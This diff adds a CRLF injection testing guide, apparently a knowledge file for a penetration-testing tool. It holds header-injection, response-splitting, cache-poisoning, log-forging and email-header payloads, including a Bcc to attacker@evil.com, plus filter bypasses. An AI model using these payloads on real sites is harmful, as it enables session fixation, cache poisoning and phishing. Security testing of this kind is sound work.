@@ -1,0 +1,260 @@
+<crlf_injection_guide>
+<title>CRLF INJECTION</title>
+
+<critical>CRLF injection occurs when attackers can inject carriage return (\r) and line feed (\n) characters into HTTP headers or responses. This enables header injection, response splitting, cache poisoning, and session fixation. Modern frameworks often sanitize these, but legacy code, custom handlers, and edge cases remain exploitable.</critical>
+
+<scope>
+- HTTP response headers (Set-Cookie, Location, Content-Type)
+- Log injection and log forging
+- Email header injection (SMTP)
+- Cache poisoning via response splitting
+- Session fixation through cookie injection
+- XSS via injected headers
+</scope>
+
+<methodology>
+1. Identify user input reflected in HTTP response headers.
+2. Test for CRLF sequence acceptance (%0d%0a, %0D%0A, \r\n variations).
+3. Attempt header injection to add malicious headers.
+4. Escalate to response splitting for cache poisoning or XSS.
+5. Test log files for CRLF-based log injection.
+</methodology>
+
+<injection_points>
+<http_headers>
+- Location header (redirects)
+- Set-Cookie header
+- Custom headers reflecting user input
+- Content-Disposition headers
+- Cache-Control manipulation
+</http_headers>
+
+<common_parameters>
+- redirect, url, next, returnUrl, callback
+- filename, download, attachment
+- language, locale, lang
+- Any parameter reflected in response headers
+</common_parameters>
+</injection_points>
+
+<payloads>
+<basic_crlf>
+{% raw %}
+# URL encoded CRLF
+%0d%0a
+%0D%0A
+
+# Double URL encoded
+%250d%250a
+%250D%250A
+
+# Mixed encoding
+%0d%0A
+%0D%0a
+
+# Unicode variations
+%E5%98%8A%E5%98%8D
+\u000d\u000a
+
+# Raw characters (where applicable)
+\r\n
+{% endraw %}
+</basic_crlf>
+
+<header_injection>
+{% raw %}
+# Inject Set-Cookie header
+victim.com/page?param=value%0d%0aSet-Cookie:%20malicious=value
+
+# Inject multiple headers
+%0d%0aX-Injected:%20true%0d%0aSet-Cookie:%20session=attacker
+
+# Content-Type injection
+%0d%0aContent-Type:%20text/html
+
+# Cache-Control manipulation
+%0d%0aCache-Control:%20public,%20max-age=31536000
+{% endraw %}
+</header_injection>
+
+<response_splitting>
+{% raw %}
+# Full response split with XSS
+%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2025%0d%0a%0d%0a<script>alert(1)</script>
+
+# Simplified response split
+%0d%0a%0d%0a<html><script>alert(document.domain)</script></html>
+
+# With HTML injection
+%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html><body>Injected</body></html>
+{% endraw %}
+</response_splitting>
+
+<log_injection>
+{% raw %}
+# Fake log entries
+%0d%0a[INFO] Fake log entry
+%0d%0a127.0.0.1 - admin [01/Jan/2024:00:00:00] "GET /admin HTTP/1.1" 200
+
+# Clear log content (dangerous)
+%0d%0a%0d%0a
+
+# Inject commands (if logs are processed)
+%0d%0a$(whoami)%0d%0a
+{% endraw %}
+</log_injection>
+
+<email_header_injection>
+{% raw %}
+# Add BCC recipient
+%0d%0aBcc:%20attacker@evil.com
+
+# Add additional recipient
+%0d%0aTo:%20attacker@evil.com
+
+# Inject email body
+%0d%0a%0d%0aInjected email body
+
+# Change subject
+%0d%0aSubject:%20Phishing%20Email
+{% endraw %}
+</email_header_injection>
+</payloads>
+
+<bypass_techniques>
+<encoding_bypass>
+{% raw %}
+# Different encodings
+%0d%0a              # Standard URL encoding
+%0D%0A              # Uppercase
+%250d%250a          # Double URL encoding
+%u000d%u000a        # Unicode encoding
+\r\n                # Raw (if not URL context)
+%c0%8d%c0%8a        # Overlong UTF-8
+
+# Null byte injection
+%00%0d%0a
+%0d%00%0a
+
+# Mixed case
+%0D%0a
+%0d%0A
+{% endraw %}
+</encoding_bypass>
+
+<filter_bypass>
+{% raw %}
+# Only LF blocked (try CR only)
+%0d
+
+# Only CR blocked (try LF only)
+%0a
+
+# Space variations
+%0d%0a%20
+%0d%20%0a
+
+# Tab injection
+%0d%0a%09
+{% endraw %}
+</filter_bypass>
+</bypass_techniques>
+
+<attack_scenarios>
+<cache_poisoning>
+{% raw %}
+# Poison cache with malicious response
+GET /page?param=value%0d%0aX-Forwarded-Host:%20evil.com HTTP/1.1
+Host: victim.com
+
+# Response splitting for cache
+GET /redirect?url=http://example.com%0d%0aContent-Length:%200%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0aCached%20XSS HTTP/1.1
+{% endraw %}
+</cache_poisoning>
+
+<session_fixation>
+{% raw %}
+# Inject session cookie
+/page?redirect=http://safe.com%0d%0aSet-Cookie:%20sessionid=attacker_session
+
+# With HttpOnly bypass attempt
+%0d%0aSet-Cookie:%20session=evil;%20Path=/;%20HttpOnly
+{% endraw %}
+</session_fixation>
+
+<xss_via_headers>
+{% raw %}
+# XSS through Content-Type
+%0d%0aContent-Type:%20text/html%0d%0aContent-Length:%2035%0d%0a%0d%0a<script>alert('XSS')</script>
+
+# XSS in custom header reflection
+%0d%0aX-Custom:%20<script>alert(1)</script>
+{% endraw %}
+</xss_via_headers>
+</attack_scenarios>
+
+<detection_techniques>
+<manual_testing>
+{% raw %}
+# Basic detection
+1. Inject %0d%0aTest:%20Header in parameter
+2. Check response headers for "Test: Header"
+3. Try encoded variations if basic fails
+
+# Response observation
+- Check for HTTP 200 with split response
+- Look for additional headers in response
+- Monitor for Set-Cookie header injection
+{% endraw %}
+</manual_testing>
+
+<automated_detection>
+{% raw %}
+# Pattern matching indicators
+- Header reflection in responses
+- Redirect URLs with user input
+- Log file user input reflection
+- Email functionality with user-controlled headers
+{% endraw %}
+</automated_detection>
+</detection_techniques>
+
+<validation>
+1. Demonstrate header injection with a custom header appearing in response.
+2. Show Set-Cookie injection leading to session fixation potential.
+3. Prove response splitting with dual HTTP responses.
+4. Document the exact injection point and encoding used.
+5. Provide minimal reproducible request/response pairs.
+</validation>
+
+<false_positives>
+- Headers sanitized/escaped by framework
+- Input validation removing CRLF characters
+- WAF blocking encoded CRLF sequences
+- Header reflection without actual injection (visual only)
+</false_positives>
+
+<impact>
+- Session fixation via cookie injection
+- Cache poisoning affecting other users
+- XSS through response body injection
+- Log forging and audit trail manipulation
+- HTTP response manipulation
+- Phishing via email header injection
+</impact>
+
+<pro_tips>
+1. Always test multiple CRLF encoding variations.
+2. Check Location header redirects first - common injection point.
+3. Test both CR-only and LF-only when full CRLF blocked.
+4. Look for custom headers that reflect user input.
+5. Email contact forms are high-value CRLF targets.
+6. Cache-based attacks multiply impact significantly.
+7. Combine with XSS for response body injection.
+8. Log injection can enable log4j-style attacks in some cases.
+9. Test unicode and overlong UTF-8 encodings.
+10. Mobile APIs often have less strict header validation.
+</pro_tips>
+
+<remember>CRLF injection transforms input sanitization gaps into header and response control. While modern frameworks mitigate this, legacy code, custom handlers, and email functionality remain vulnerable. Always test with multiple encodings and target high-impact headers like Set-Cookie and Location.</remember>
+</crlf_injection_guide>
